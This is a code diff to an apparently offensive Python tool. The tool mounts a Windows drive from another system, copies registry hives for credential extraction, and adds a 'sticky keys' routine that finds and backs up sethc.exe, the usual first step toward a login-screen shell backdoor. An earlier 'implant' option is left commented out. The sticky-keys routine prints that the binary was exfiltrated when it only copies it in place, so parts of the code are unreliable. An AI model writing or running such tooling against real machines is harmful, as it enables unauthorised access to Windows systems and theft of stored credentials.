@@ -71,7 +71,38 @@ def mount_drive(drive):
             '/mnt/windows'.format(drive.get_source()), shell=True)
     time.sleep(1)
 
-def locate_paths():
+
+def locate_sticky_keyz():
+    # gotta make this shit find stickykeys exe on any windows machine
+    target_directories = dict()
+    base_dir = os.listdir('/mnt/windows')
+    
+    targets = []
+    for next_dir in base_dir:
+        if 'windows' == next_dir.casefold():
+            target_directories['windows'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}'.format(
+            target_directories['windows'])):
+        if 'system32' == next_dir.casefold():
+            target_directories['system32'] = next_dir
+    for next_dir in os.listdir('/mnt/windows/{}/{}'.format(
+            target_directories['windows'], 
+            target_directories['system32'])):
+        if 'sethc.exe' == next_dir.casefold():
+            target_directories['sethc']  = next_dir
+            targets.append('{}/{}/{}'.format(target_directories["windows"], 
+                target_directories["system32"],
+                target_directories["sethc"]))
+
+        
+    return target_directories 
+
+
+
+
+
+
+def locate_registry_paths():
     #target_directories = ['windows', 'system32', 'config']
     target_directories = dict()
     base_dir = os.listdir('/mnt/windows')
@@ -120,19 +151,65 @@ def locate_paths():
                 hive))
     return targets
 
-def copy_winpayload():
+def get_sticky_shell():
+
+        # gotta use the mount point made by mount_drive here from the 
+        # user input i should implement some code that suggests a drive 
+        # to choose based off of mounting other ones and lsing
+        # them. This will be slow but very cool
+        target_paths = locate_sticky_keyz()
+        #print(os.listdir('/mnt/windows/{}/{}'.format(target_paths["windows"], 
+        #        target_paths["system32"])))
+        
+        stamp = str(datetime.datetime.now().timestamp())
+        directory = '{}/sticky_binary{}'.format(os.getcwd(), stamp[:10])
+        os.mkdir(directory) 
+        #print('/mnt/windows/{}/{}/{}'.format(
+        #        target_paths["windows"], 
+        #        target_paths["system32"],
+        #        target_paths["sethc"]))
+    
+    
+        try:
+            shutil.copyfile('/mnt/windows/{}/{}/{}'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["sethc"]), 
+
+                '/mnt/windows/{}/{}/{}.bak'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["sethc"]))
+
+        except FileNotFoundError as e:
+            print(e)
+            print('/mnt/windows/{}/{}/{} was not found'.format(
+                target_paths["windows"], 
+                target_paths["system32"],
+                target_paths["sethc"]))
+
+
+        print('stickykeyz binary have been succesfully exfiltrated to your pwd')
+        # optimize this...
+        time.sleep(1)
+        subprocess.Popen('sudo umount /mnt/windows', shell=True)
+        print('Drive has been unmounted from /mnt/windows')
+
+
+def copy_registries():
     # gotta use the mount point made by mount_drive here from the 
     # user input i should implement some code that suggests a drive 
     # to choose based off of mounting other ones and lsing
     # them. This will be slow but very cool
     
-    target_paths = locate_paths()
+    target_paths = locate_registry_paths()
     stamp = str(datetime.datetime.now().timestamp())
     directory = '{}/hives_{}'.format(os.getcwd(), stamp[:10])
     os.mkdir(directory) 
 
     
     for path in target_paths:
+        print(path)
         try:
             shutil.copyfile(path, 
                     '{}/{}'.format(directory, path.split('/').pop()))
@@ -210,7 +287,7 @@ def pretty_print(drives):
     # takes as input an instance of the Drive class and prints
     # out useful data about the given drive.
 
-    subprocess.call('cat assets/ascii_art', shell=True)
+    # subprocess.call('cat assets/ascii_art', shell=True)
     print('\n\n     *******************************************************'
             '***************     ',
     end ='')
@@ -241,6 +318,7 @@ def pretty_print(drives):
             end ='\n')
 
 
+
 def main():
 
     parser = argparse.ArgumentParser(
@@ -249,7 +327,9 @@ def main():
     group = parser.add_mutually_exclusive_group()
     group.add_argument('-xh', '--extract_hives', action='store_true')
     group.add_argument('-i', '--implant', action='store_true')
-    group.add_argument('-pp', '--pretty_print', action='store_true')
+    group.add_argument('-pd', '--print_drives', action='store_true')
+    group.add_argument('-sk', '--sticky_keyz', action='store_true')
+
     args = parser.parse_args()
 
     # this grabs the raw text for the connected drives
@@ -258,14 +338,18 @@ def main():
     conected_drives = store_drives(raw_drives)
     if args.extract_hives:
         if check_for_windrives(raw_drives):
-            copy_winpayload()
-    if args.pretty_print:
+            copy_registries()
+    if args.print_drives:
         pretty_print(conected_drives)
-    elif args.implant:
+
+    elif args.sticky_keyz:
         if check_for_windrives(raw_drives):
-            implant_malware()
-    else:
-        print('invalid flag')
+            get_sticky_shell()
+
+
+#    elif args.implant:
+#        if check_for_windrives(raw_drives):
+#            implant_malware()
 
 if __name__ == '__main__':
     main()
